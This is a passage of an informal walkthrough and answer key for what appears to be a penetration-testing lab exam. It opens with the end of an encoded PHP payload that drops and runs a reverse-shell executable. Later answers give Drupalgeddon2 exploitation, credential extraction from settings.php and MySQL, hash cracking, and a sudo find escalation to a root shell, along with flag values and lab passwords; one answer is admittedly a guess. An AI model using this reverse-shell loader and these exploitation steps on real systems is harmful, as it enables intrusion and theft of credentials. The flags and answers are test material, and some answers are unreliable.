QcYB5gm2KyxVHaI8DYCMi7Yyxi7NBQoYbzpVNoC87VkFDfaVHMDQYOEjSKL2BmKhG1/LHnxYCSEc06Um6OdpR6YZXcrhCzNt/O8QhgnTpRpVW78NVf1erdoBnNLmSh8RzdaOITCsu/p7fusfAjXE/dPkH4ppr2ALXgLPEER7G2OwW6Z9OZ1N24MNQhe1Vj0xmIY+MYx6rLYR1BG010DtIJjzC+bWIA+FU3QTtTvRle4hhLsPBGByJjRrAPVTPWEPH0y/MkC8YqIXNy2e1FgGMGMzuVYlHT92GhoAIwDoCdYmOEDPBw2FnoAJ3euzGO01InJYhPqH0HJEE9yte5EY8fRMAnJ45sUESifocFozaHmMHM5FAf0ZKTqi1cYQpH7mVUFM/DYwLhG5b9h9Ar16GihfI3DLT4qJj5kBkwzHZ4iG+rVoUqKX6auNa2O2YeKQ20JDCFuzDVjZpP5VO6QZ9ItFEMucDQ2ghgNMf1Nkgm224TYiMJv+469Iu2UkpZGCljZxAC2qdoI39ncSYeIA/y//C6S0HQBE7X/EvkBjzZ+wSjQu+RNWj8bG9v++bjOK30O1H9XnqGJvAwD99pu5eW8t+631fGsjQ2PXh/J8vD1CeDxApspOU8LoMU4KJMZ581H0jRsdHPmWAfAUQhFPkqoUKvO4ABAuhmeeT1yRSClWqQBgg+T10QzFYPRo91vMlUoVab9FYUqxGP3m0FzJ6+TXiQBfokhF//zoHVuRlimG0dozN+f/O7/5vwA=";
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);
```
and start the reverse shell to the attacker machine with 'nc -lvnp 1234' OR you can use the metasploit 'multi/handler' module for the reverse shell.

19. What is the password of the user account "mary" on WINSERVER-03?
- hotmama FLAG. migrate and do the hashdump save it and crack it with john

20. What host within the DMZ network can be exploited via command injection.
- WINSERVER-02

21. What is the CVSS V3.x rating for the Drupalgeddon2 vulnerability?
- 8.1 https://www.tenable.com/plugins/was/98563

22. What web server contains a file called "todo.txt"?
- WINSERVER-03 go to the meterpreter session and run search -f todo.txt you will gona find it.

23. How many Drupal accounts exist on the Drupal site?
- 4 after getting access to the system. Refer Qustion 12. run 'cat /etc/shadow | grep bash'.

24. What host on the DMZ network is running a database server on port 3307?
- 192.168.100.52 in first nmap scan you can observe this port as a open port

25. What WordPress file stores the database configuration?
- wp-config by default this is the file that contents the database configuration.

26. What version of WordPress is running on WINSERVER-01?
- 5.9.3 yet not finded just guess

27. What is the version of the Linux kernel running on the system hosting the Drupal site?
- 5.13.0 after getting basic access Refer Question 12. run 'uname -r'

28. Excluding the guest account, how many user accounts are present on WINSERVER-01?
- 4 refer question 18

29. What is the total number of open TCP ports running on WINSERVER-02?
- 14 this question is tricker when you scan first 1000 ports at that time it show less than 14 ports but when you scan all the 65535 ports at this time you get this all ports. 

30. What host on the network contains a user account called "lawrence"?
- WINSERVER-03  you can get the user list via executing cmd command net users

31. Which one of the following user accounts is present on WINSERVER-02?
- steven same for this lab as well you can get the user list via typing same command in cmd net users

32. The server hosting Drupal contains the file /home/auditor/flag.txt. What is the value of the flag?
- 09400ba16fbd4f9994146cfe65d9c8a5 FLAG. first search the drupal exploits in metasploit  drupal_drupalgeddon2) and set targeturi /drupal and change the user to dbadmin with given password from question 17

33. A system contains the file C:\Users\mike\Documents\flag.txt; what is the value of the flag?
- a859979746ed44ab82e3cec11e45edc6

34. What Windows utility can be used to download files from a remote web server?
- certutil that the answer you had learn it in a course

35. What is the value of the flag /root/flag.txt on the host running Drupal?
- 47fb189191964e8daa3b84211ef2c163 FLAG. Refer Question 18. Misconfigured SUDO Permissions. First drupal version is 7.57 which is vulnerable to CVE-2018-7600  and this can be exploited with Drupalgeddon2 this module of metasploit after exploitation we get the www-data user access we move and search for the file that holds the configuration for drupal 'cat /var/www/html/drupal/sites/default/settings.php' and then we find out the mysql username and password in it we can use this mysql id and password to login and see the databases in the same session 'mysql -u drupal -h localhost --password='drupal0421' -e 'show databases; | use drupal; select * from users;'' copy the hash for the auditor user then crack it with hash cat 'hashcat hash /usr/share/wordlists/rockyou.txt -m 7900'. you will get the user password 'qwertyuiop' then use this id 'auditor' and password 'qwertyuiop' and login 'su auditor' after that use 'sudo -l' and search for the 'gtfboins for find command with SUID' and this as a sudo 'sudo find . -exec /bin/sh \; -quit' and boom. and now cat the flag of 'cat /root/flag.txt'

/wp-content/themes/RightNow/plugins





